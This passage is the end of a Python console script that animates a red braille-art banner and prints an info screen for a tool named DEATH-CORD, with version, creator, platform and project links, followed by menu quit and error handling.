            print(Fore.RED + "⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⡠⡀⠀⠀")
            time.sleep(sleep_animation)
            print(Fore.RED + "⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⡹⠪⣀⢄")
            time.sleep(sleep_animation)
            print(Fore.RED + "⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⡕⠬⡚⢤⠊⠈⠉")
            time.sleep(sleep_animation)
            print(Fore.RED + "⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠊⠀⢀⣘⣶⢵⠆⠀")
            time.sleep(sleep_animation)
            print(Fore.RED + " ⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⡁⠀⣐⣴⡿⠁⠀⠀⠀")
            time.sleep(sleep_animation)
            print(Fore.RED + " ⠀⠀⠀⠀⠀⠀⠀⣠⠞⠀⠈⢔⡵⠋⠀⠀⠀⠀⠀")
            time.sleep(sleep_animation)
            print(Fore.RED + " ⠀⠀⠀⠀⠀⢀⡼⠃⠀⢄⣵⠟⠁⠀⠀⠀⠀⠀⠀")
            time.sleep(sleep_animation)
            print(Fore.RED + " ⠀⠀⠀⠀⠀⣻⠀⢀⢖⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀")
            time.sleep(sleep_animation)
            print(Fore.RED + " ⠀⠀⠀⠀⠀⡵⠵⠞⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
            time.sleep(sleep_animation)
            print(Fore.RED + " ⠀⠀⠀⣠⠞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
            time.sleep(sleep_animation)
            print(Fore.RED + " ⠀⢀⡴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
            time.sleep(sleep_animation)
            print(Fore.RED + " ⣠⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
            time.sleep(sleep_animation)
            print(Fore.RED + "⠘⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
            time.sleep(sleep_animation)

            print(Fore.RESET + f'Tool Name: {Fore.RED}DEATH-CORD')
            time.sleep(sleep_animation)
            print(Fore.RESET + f'Version: {Fore.RED}1.2')
            time.sleep(sleep_animation)
            print(Fore.RESET + f'Maded on: {Fore.RED}Pyhton 3.12')
            time.sleep(sleep_animation)
            print(Fore.RESET + f'Creator: {Fore.RED}FR')
            time.sleep(sleep_animation)
            print(Fore.RESET + f'Platform: {Fore.RED}Windows 10/Widnows 11')
            time.sleep(sleep_animation)
            print(Fore.RESET + f'Github: {Fore.RED}https://github.com/FR-birdit/DEATH-CORD')
            time.sleep(sleep_animation)
            print(Fore.RESET + f'Discord: {Fore.RED}https://dsc.gg/deathcord')
            time.sleep(sleep_animation)

            input(Fore.LIGHTRED_EX + 'Press enter')
            start()
        elif user_input == '28':
            quit()

        else:
            messagebox.showerror('DEATH', 'Error occurred: Wrong user input!')
            quit()

    except Exception as e:
        messagebox.showerror('DEATH', f'Error occurred: {e}')

start()